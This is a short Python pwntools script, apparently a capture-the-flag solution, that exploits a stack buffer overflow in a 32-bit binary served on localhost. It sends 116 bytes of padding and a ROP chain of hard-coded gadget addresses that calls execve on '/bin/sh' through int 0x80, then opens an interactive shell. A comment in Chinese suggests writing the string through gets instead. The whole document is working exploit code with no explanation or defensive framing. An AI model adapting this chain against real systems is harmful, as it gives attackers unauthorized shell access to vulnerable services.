#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.arch = 'i386'
r = remote('127.0.0.1', 10000)

raw_input('pause')

pop_eax_ret = 0x080bb736
pop_edx_ecx_ebx_ret = 0x0806f750
sh_str = 0x80be990
int_0x80 = 0x08049431

r.send('A'*116 + #padding
       p32(pop_eax_ret) + # pop eax; ret
       p32(11) + # eax = 11
       p32(pop_edx_ecx_ebx_ret) +
       p32(0) + # edx = 0
       p32(0) + # ecx = 0
#       p32() + # /bin/sh可call gets將"/bin/sh"放到global(因為固定address)，再把address寫在這
       p32(sh_str) + # ebx = '/bin/sh'
       p32(int_0x80) + # int 0x80
       '\n')

r.interactive()
